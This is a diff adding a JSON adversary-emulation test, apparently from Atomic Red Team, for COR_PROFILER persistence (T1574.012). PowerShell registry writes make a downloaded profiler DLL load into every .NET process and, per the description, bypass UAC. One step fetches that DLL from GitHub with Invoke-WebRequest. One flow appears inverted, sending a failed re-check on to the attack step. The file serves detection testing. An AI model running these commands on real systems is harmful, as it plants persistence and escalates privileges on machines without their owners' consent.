@@ -1,0 +1,111 @@
+{
+  "id": "f373b482-48c8-4ce4-85ed-d40c8b3f7310",
+  "name": "System Scope COR_PROFILER",
+  "description": "Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect.\nThe unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity\nlevel of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will\nstill execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "a85367fb-666a-47ea-a0b7-c94310382bf3",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host \"Creating system environment variables\" -ForegroundColor Cyan\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"#{clsid_guid}\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"#{file_name}\" -Force | Out-Null\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "39472a5a-5b41-4239-b9e5-2d3160eab1e0",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "6f15523b-026f-4c86-bcc4-591b224699e4",
+      "name": "Check dependency 1/1",
+      "description": "\"#{file_name}\" must be present\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "05ca786a-1bfe-475b-a490-c6d053918de0",
+      "name": "Resolve dependency 1/1",
+      "description": "\"#{file_name}\" must be present\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll\" -OutFile \"#{file_name}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "42810340-0e92-4ede-a966-e8e4dd1408cc",
+      "name": "Re-check dependency 1/1",
+      "description": "\"#{file_name}\" must be present\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "a85367fb-666a-47ea-a0b7-c94310382bf3",
+      "p": "on-success",
+      "o": "39472a5a-5b41-4239-b9e5-2d3160eab1e0"
+    },
+    {
+      "s": "a85367fb-666a-47ea-a0b7-c94310382bf3",
+      "p": "on-failure",
+      "o": "39472a5a-5b41-4239-b9e5-2d3160eab1e0"
+    },
+    {
+      "s": "6f15523b-026f-4c86-bcc4-591b224699e4",
+      "p": "on-success",
+      "o": "a85367fb-666a-47ea-a0b7-c94310382bf3"
+    },
+    {
+      "s": "6f15523b-026f-4c86-bcc4-591b224699e4",
+      "p": "on-failure",
+      "o": "05ca786a-1bfe-475b-a490-c6d053918de0"
+    },
+    {
+      "s": "05ca786a-1bfe-475b-a490-c6d053918de0",
+      "p": "on-success",
+      "o": "42810340-0e92-4ede-a966-e8e4dd1408cc"
+    },
+    {
+      "s": "42810340-0e92-4ede-a966-e8e4dd1408cc",
+      "p": "on-failure",
+      "o": "a85367fb-666a-47ea-a0b7-c94310382bf3"
+    }
+  ],
+  "tags": [
+    "T1574.012",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "clsid_guid",
+      "type": "string",
+      "description": "custom clsid guid",
+      "value": "{09108e71-974c-4010-89cb-acf471ae9e2c}"
+    },
+    {
+      "name": "file_name",
+      "type": "path",
+      "description": "unmanaged profiler DLL",
+      "value": "PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll"
+    }
+  ]
+}
